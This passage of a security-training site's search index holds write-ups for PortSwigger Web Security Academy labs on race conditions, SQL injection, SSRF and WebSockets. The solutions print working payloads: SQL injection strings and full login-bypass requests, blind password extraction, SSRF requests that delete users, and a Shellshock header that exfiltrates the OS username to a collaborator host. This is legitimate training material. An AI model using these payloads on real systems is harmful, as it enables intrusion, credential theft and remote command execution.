conditions"],"tags":["race-conditions","limit-overrun"]},{"location":"Resources/Labs/PortSwigger/Race-Conditions/race-lab-1/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Always keep an eye out for instances where there are single-use items -- like coupon codes -- and test for race conditions. </p>","path":["Resources","Labs","PortSwigger","Race Conditions","Limit overrun race conditions"],"tags":["race-conditions","limit-overrun"]},{"location":"Resources/Labs/PortSwigger/Race-Conditions/race-lab-2/","level":1,"title":"Single-endpoint race conditions","text":"","path":["Resources","Labs","PortSwigger","Race Conditions","Single-endpoint race conditions"],"tags":["race-conditions"]},{"location":"Resources/Labs/PortSwigger/Race-Conditions/race-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab's email change feature contains a race condition that enables you to associate an arbitrary email address with your account.</p> <p>Someone with the address <code>carlos@ginandjuice.shop</code> has a pending invite to be an administrator for the site, but they have not yet created an account. Therefore, any user who successfully claims this address will automatically inherit admin privileges.</p> <p>To solve the lab:</p> <ol> <li>Identify a race condition that lets you claim an arbitrary email address.</li> <li>Change your email address to <code>carlos@ginandjuice.shop</code>.</li> <li>Access the admin panel.</li> <li>Delete the user <code>carlos</code></li> </ol> <p>You can log in to your own account with the following credentials: <code>wiener:peter</code>.</p>","path":["Resources","Labs","PortSwigger","Race Conditions","Single-endpoint race conditions"],"tags":["race-conditions"]},{"location":"Resources/Labs/PortSwigger/Race-Conditions/race-lab-2/#solution","level":2,"title":"Solution","text":"<p>Notice that the application has a feature that allows you to change your email. We also have access to an email client where the confirmation link will be sent. </p> <p></p> <p>In repeater, we can create a tab group with one tab containing an email belonging to our own email server, as shown below:</p> <p></p> <p>And the second tab containing the target email address, as shown below:</p> <p></p> <p>Then send the requests in parallel to try to exploit the race window. I needed to do this several times before I got a confirmation email to change my email address to carlos. </p> <p></p> <p>Confirm the change and then delete carlos from the admin panel to complete the lab.</p>","path":["Resources","Labs","PortSwigger","Race Conditions","Single-endpoint race conditions"],"tags":["race-conditions"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/slqi-lab-7/","level":1,"title":"Blind SQL injection with conditional errors","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","Blind SQL injection with conditional errors"],"tags":["sql","injection","blind","errors"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/slqi-lab-7/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p> <p>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.</p> <p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p> <p>To solve the lab, log in as the <code>administrator</code> user.</p>","path":["Resources","Labs","PortSwigger","SQL Injection","Blind SQL injection with conditional errors"],"tags":["sql","injection","blind","errors"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/slqi-lab-7/#solution","level":2,"title":"Solution","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","Blind SQL injection with conditional errors"],"tags":["sql","injection","blind","errors"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-1/","level":1,"title":"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:</p> <p><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></p> <p>To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.</p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-1/#solution","level":2,"title":"Solution","text":"<p>Selecting the \"Gifts\" category sends the following HTTP request:</p> Initial request<pre><code>GET /filter?category=Gifts HTTP/2\nHost: 0ac600c104a6ea1f8142ac0500a90084.web-security-academy.net\nCookie: session=inWxWwQQf5vbyXBx1iITGLWCQLAigyvg\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0ac600c104a6ea1f8142ac0500a90084.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p>Adding a single quote after the query results in an error.</p> <p></p> <p>Adding a second single quote resolves the error. We can add an always true condition to display all products.</p> Final payload<pre><code>' OR 1=1-- -\n</code></pre> <p></p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-2/","level":1,"title":"Sqli lab 2","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","Sqli lab 2"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the login function.</p> <p>To solve the lab, perform a SQL injection attack that logs in to the application as the <code>administrator</code>user.</p>","path":["Resources","Labs","PortSwigger","SQL Injection","Sqli lab 2"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-2/#solution","level":2,"title":"Solution","text":"<p>When we first send an invalid password, we get the following error:</p> Invalid logon request<pre><code>POST /login HTTP/2\nHost: 0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nCookie: session=iB1idDnwSqOV70T4DLpWfM68h94zU5E2\nContent-Length: 78\nCache-Control: max-age=0\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nOrigin: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net/login\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n\ncsrf=YvvJHYFQ9kAjzWNBu9gaWBatg2bYar9n&amp;username=administrator&amp;password=password\n</code></pre> <p></p> <p>If we just comment out the password field, we can bypass the authentication check and just log in with the username.</p> Final payload<pre><code>POST /login HTTP/2\nHost: 0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nCookie: session=HCToViKrVJ273UADzIXS5QEtpbSU5ovg\nContent-Length: 85\nCache-Control: max-age=0\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nOrigin: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0ab900a10465b08981a5a2c20086002b.web-security-academy.net/login\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n\ncsrf=ftR0shmzbkLwCvuHdiNgunnZso1OGD1X&amp;username=administrator%27--+-&amp;password=password\n</code></pre> <p></p>","path":["Resources","Labs","PortSwigger","SQL Injection","Sqli lab 2"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-3/","level":1,"title":"SQL injection attack, querying the database type and version on Oracle","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on Oracle"],"tags":["injection","sql"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p> <p>To solve the lab, display the database version string.</p> Hint <p>On Oracle databases, every <code>SELECT</code> statement must specify a table to select <code>FROM</code>. If your <code>UNION SELECT</code> attack does not query from a table, you will still need to include the <code>FROM</code> keyword followed by a valid table name.</p> <p>There is a built-in table on Oracle called <code>dual</code> which you can use for this purpose. For example: <code>UNION SELECT 'abc' FROM dual</code></p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on Oracle"],"tags":["injection","sql"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-3/#solution","level":2,"title":"Solution","text":"<p>Since the vulnerability lies in the category parameter, we will focus there. </p> Initial request<pre><code>GET /filter?category=Gifts HTTP/2\nHost: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net\nCookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p>After testing with basic UNION payloads, we find that there are two columns returned. </p> <p>The following query retrieves the database version.</p> Final payload<pre><code>GET /filter?category=Gifts'+UNION+SELECT+null,banner+FROM+v$version-- HTTP/2\nHost: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net\nCookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p></p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on Oracle"],"tags":["injection","sql"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-4/","level":1,"title":"SQL injection attack, querying the database type and version on MySQL and Microsoft","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on MySQL and Microsoft"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-4/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p> <p>To solve the lab, display the database version string.</p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on MySQL and Microsoft"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-4/#solution","level":2,"title":"Solution","text":"<p>This lab's vulnerability also exists in the product category filter. </p> Initial request<pre><code>GET /filter?category=Accessories HTTP/2\nHost: 0a2000a704a6cc3882beecb30094003d.web-security-academy.net\nCookie: session=D0rDHXHnKigBaVlNS4XudF2vHwKuxnvx\nSec-Ch-Ua: \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://0a2000a704a6cc3882beecb30094003d.web-security-academy.net/\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\n</code></pre> <p>Testing shows that there are two categories returned, and the following payload works to display arbitrary content.</p> Show arbitrary content<pre><code>Accessories' UNION SELECT null,'abc'-- -\n</code></pre> <p> Now we can send the following request to print out the database version:</p> Print the database version<pre><code>Accessories' UNION SELECT null,@@version-- -\n</code></pre> <p></p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, querying the database type and version on MySQL and Microsoft"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-5/","level":1,"title":"SQL injection attack, listing the database contents on non-Oracle databases","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, listing the database contents on non-Oracle databases"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-5/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p> <p>The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.</p> <p>To solve the lab, log in as the <code>administrator</code> user.</p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, listing the database contents on non-Oracle databases"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-5/#solution","level":2,"title":"Solution","text":"<p>This lab </p>","path":["Resources","Labs","PortSwigger","SQL Injection","SQL injection attack, listing the database contents on non-Oracle databases"],"tags":["sql","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-6/","level":1,"title":"Blind SQL injection with conditional responses","text":"","path":["Resources","Labs","PortSwigger","SQL Injection","Blind SQL injection with conditional responses"],"tags":["sql","blind","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-6/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.</p> <p>The results of the SQL query are not returned, and no error messages are displayed. But the application includes a<code>Welcome back</code> message in the page if the query returns any rows.</p> <p>The database contains a different table called <code>users</code>, with columns called <code>username</code> and <code>password</code>. You need to exploit the blind SQL injection vulnerability to find out the password of the <code>administrator</code> user.</p> <p>To solve the lab, log in as the <code>administrator</code> user.</p>","path":["Resources","Labs","PortSwigger","SQL Injection","Blind SQL injection with conditional responses"],"tags":["sql","blind","injection"]},{"location":"Resources/Labs/PortSwigger/SQL-Injection/sqli-lab-6/#solution","level":2,"title":"Solution","text":"<p>Note that if we inject an always true condition in the tracking cookie, we get the \"Welcome back\" message.</p> <p></p> <p>If we change it to 1=2, then the message disappears. </p> <p></p> <p>We can confirm the presence of the 'users' table with the following:</p> Confirm users table<pre><code>Cookie: TrackingId=DEJ3vcjdRcpt0BQs' AND (SELECT 'a' from users LIMIT 1)='a; session=Ka4zPIbsWJdLRywMh51LGEWpkKh0SaRV\n</code></pre> <p>We can also confirm that there is a user named 'administrator' with:</p> Confirm administrator user<pre><code>Cookie: TrackingId=DEJ3vcjdRcpt0BQs' AND (SELECT 'a' from users WHERE username='administrator')='a; session=Ka4zPIbsWJdLRywMh51LGEWpkKh0SaRV\n</code></pre> <p>To recover the administrator user's password, we can extract one character at a time. </p> Extract administrator's password<pre><code>Cookie: TrackingId=DEJ3vcjdRcpt0BQs' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='4; session=Ka4zPIbsWJdLRywMh51LGEWpkKh0SaRV\n</code></pre> <p>Add placeholders on the first 1 and the final character:</p> <p></p> <p>Running this in intruder and filtering by which responses display the \"Welcome back\" message will give us the administrator's password. Then we can log in as the admin and solve the lab.</p>","path":["Resources","Labs","PortSwigger","SQL Injection","Blind SQL injection with conditional responses"],"tags":["sql","blind","injection"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-1/","level":1,"title":"Basic SSRF against the local server","text":"","path":["Resources","Labs","PortSwigger","SSRF","Basic SSRF against the local server"],"tags":["ssrf"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a stock check feature which fetches data from an internal system.</p> <p>To solve the lab, change the stock check URL to access the admin interface at <code>http://localhost/admin</code> and delete the user <code>carlos</code>.</p>","path":["Resources","Labs","PortSwigger","SSRF","Basic SSRF against the local server"],"tags":["ssrf"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-1/#solution","level":2,"title":"Solution","text":"<p>Checking the stock of an item sends the following request:</p> Initial stock check<pre><code>POST /product/stock HTTP/1.1\nHost: 0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\nOrigin: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nConnection: keep-alive\nCookie: session=l4jOdFtuL3McNvQR3uAr6rvmekArDVFZ\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\nstockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1 \n</code></pre> <p>Note that the stockAPI is making a call to <code>http://stock.weliketoshop.net/...</code>. </p> <p>We can try to change that to <code>localhost/admin</code> to see if we can get anything.</p> <p>Change the body of the POST request to <code>stockApi=http://localhost/admin</code>. Be sure to remove the storeId parameter or it will return \"not found\". </p> <p>When we send this we see the endpoints to delete the users.</p> <p></p> <p>Send the following POST request to solve the lab.</p> Delete carlos<pre><code>POST /product/stock HTTP/1.1\nHost: 0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 107\nOrigin: https://0a85006e04b1b88482b63daa007600e1.web-security-academy.net\nConnection: keep-alive\nCookie: session=l4jOdFtuL3McNvQR3uAr6rvmekArDVFZ\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\nstockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos\n</code></pre>","path":["Resources","Labs","PortSwigger","SSRF","Basic SSRF against the local server"],"tags":["ssrf"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-2/","level":1,"title":"Basic SSRF against another back-end system","text":"","path":["Resources","Labs","PortSwigger","SSRF","Basic SSRF against another back-end system"],"tags":["ssrf"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a stock check feature which fetches data from an internal system.</p> <p>To solve the lab, use the stock check functionality to scan the internal <code>192.168.0.X</code> range for an admin interface on port <code>8080</code>, then use it to delete the user <code>carlos</code>.</p>","path":["Resources","Labs","PortSwigger","SSRF","Basic SSRF against another back-end system"],"tags":["ssrf"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-2/#solution","level":2,"title":"Solution","text":"<p>View any item and check the stock. Notice that the stockAPI makes a request to 192.168.0.X. Change the endpoint to /admin and send the request to intruder. </p> Intruder request to /admin<pre><code>POST /product/stock HTTP/1.1\nHost: 0a160088041648828637c7c100e30045.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a160088041648828637c7c100e30045.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 96\nOrigin: https://0a160088041648828637c7c100e30045.web-security-academy.net\nConnection: keep-alive\nCookie: session=idvkWi3Mg7hf5Y2JA6V0xfqVw8Fsw0Ig\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\nstockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin\n</code></pre> <p>Set a placeholder on the last octet and launch the attack. Most of the responses returned a 500 status code, so filter on the one(s) that are not 500s. </p> <p></p> <p>We find that /admin is hosted on 192.168.0.112. Now we can send this to repeater and change the endpoint to <code>/admin/delete?username=carlos</code>. </p> Solve the lab<pre><code>POST /product/stock HTTP/1.1\nHost: 0a160088041648828637c7c100e30045.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a160088041648828637c7c100e30045.web-security-academy.net/product?productId=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 50\nOrigin: https://0a160088041648828637c7c100e30045.web-security-academy.net\nConnection: close\nCookie: session=idvkWi3Mg7hf5Y2JA6V0xfqVw8Fsw0Ig\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: magenta\nPriority: u=0\n\nstockApi=http%3A%2F%2F192.168.0.112%3A8080%2Fadmin/delete?username=carlos\n</code></pre> <p>Follow the redirection and solve the lab.</p>","path":["Resources","Labs","PortSwigger","SSRF","Basic SSRF against another back-end system"],"tags":["ssrf"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-3/","level":1,"title":"Blind SSRF with out-of-band detection","text":"","path":["Resources","Labs","PortSwigger","SSRF","Blind SSRF with out-of-band detection"],"tags":["ssrf","OAST"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.</p> <p>To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.</p> <p>Note</p> <p>Note that Burp Professional is required for this lab since we need collaborator.</p>","path":["Resources","Labs","PortSwigger","SSRF","Blind SSRF with out-of-band detection"],"tags":["ssrf","OAST"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-3/#solution","level":2,"title":"Solution","text":"<p>View a product and then send that request to repeater. </p> <p>Replace the referer URL with a collaborator payload, as shown below. </p> SSRF in referer header<pre><code>GET /product?productId=2 HTTP/2\nHost: 0a39000a03068753817ab66c00bc005c.web-security-academy.net\nCookie: session=ASepnUXdnTkK6Yokeq0tYsF0PSmHfoB7\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://hyjqvo48j74xnor88pby8gbqwh28qzeo.oastify.com\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-Pwnfox-Color: magenta\nPriority: u=0, i\nTe: trailers\n</code></pre> <p>Note that after sending this request we get a hit in collaborator.</p> <p></p> <p>This solves the lab. </p>","path":["Resources","Labs","PortSwigger","SSRF","Blind SSRF with out-of-band detection"],"tags":["ssrf","OAST"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-6/","level":1,"title":"Blind SSRF with Shellshock exploitation","text":"","path":["Resources","Labs","PortSwigger","SSRF","Blind SSRF with Shellshock exploitation"],"tags":["ssrf","shellshock"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-6/#instructions","level":2,"title":"Instructions","text":"<p>This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.</p> <p>To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the <code>192.168.0.X</code> range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.</p>","path":["Resources","Labs","PortSwigger","SSRF","Blind SSRF with Shellshock exploitation"],"tags":["ssrf","shellshock"]},{"location":"Resources/Labs/PortSwigger/SSRF/ssrf-lab-6/#solution","level":2,"title":"Solution","text":"<p>Note that adding a collaborator payload in the referer header results in a request to our collaborator instance that contains a user-agent string.</p> <p></p> <p>Send this request to intruder.</p> <p>Since we're trying to access the admin endpoint on a 192.168.0.X host, that is what needs to go in the referer header. Put the following string in the User-Agent header:</p> Shellshock payload<pre><code>() { :; }; /usr/bin/nslookup $(whoami).njawgupe4dp38ucetvw4tmwwhnneb6zv.oastify.com\n</code></pre> <p>Set a placeholder in the last octet of the IP address in the referer header, as shown below:</p> Intruder request<pre><code>GET /product?productId=1 HTTP/2\nHost: 0aca0004032e8cf4830c64f800d500da.web-security-academy.net\nCookie: session=05yYj1i8IdA67wkxUsEKIUlrPRyPrE9i\nUser-Agent: () { :; }; /usr/bin/nslookup $(whoami).njawgupe4dp38ucetvw4tmwwhnneb6zv.oastify.com\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.0.1:8080\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-Pwnfox-Color: magenta\nPriority: u=0, i\nTe: trailers\n</code></pre> <p>After running this attack through intruder, notice that we get a DNS lookup to collaborator with the username as a subdomain.</p> <p></p> <p>Submit the username to solve the lab.</p>","path":["Resources","Labs","PortSwigger","SSRF","Blind SSRF with Shellshock exploitation"],"tags":["ssrf","shellshock"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websocket-lab-1/","level":1,"title":"Manipulating WebSocket messages to exploit vulnerabilities","text":"","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating WebSocket messages to exploit vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websocket-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This online shop has a live chat feature implemented using WebSockets.</p> <p>Chat messages that you submit are viewed by a support agent in real time.</p> <p>To solve the lab, use a WebSocket message to trigger an <code>alert()</code> popup in the support agent's browser.</p>","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating WebSocket messages to exploit vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websocket-lab-1/#solution","level":2,"title":"Solution","text":"<p>Note that chat messages are viewed by support in real time. </p> <p>Intercept or send a WS request to repeater and modify it as follows:</p> <p></p> <p>This will trigger the alert and solve the lab. </p>","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating WebSocket messages to exploit 